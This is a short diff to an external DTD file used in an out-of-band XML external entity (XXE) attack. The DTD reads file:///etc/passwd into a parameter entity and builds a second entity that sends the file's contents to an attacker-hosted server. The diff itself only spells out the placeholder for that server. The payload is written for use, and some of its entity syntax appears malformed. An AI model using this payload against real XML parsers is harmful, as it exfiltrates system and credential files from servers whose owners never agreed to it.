@@ -2,7 +2,7 @@ Server File:(save it as anyname.dtd)
 ============
 
 <!ENTITY % file SYSTEM "file:///etc/passwd"
-<!ENTITY % p2 "<ENTITY e1 SYSTEM 'http://<my_server/dummy?%file;'>">
+<!ENTITY % p2 "<ENTITY e1 SYSTEM 'http://<my_server_where_dtd_was_hosted>/dummy?%file;'>">
 %p2;
 
 
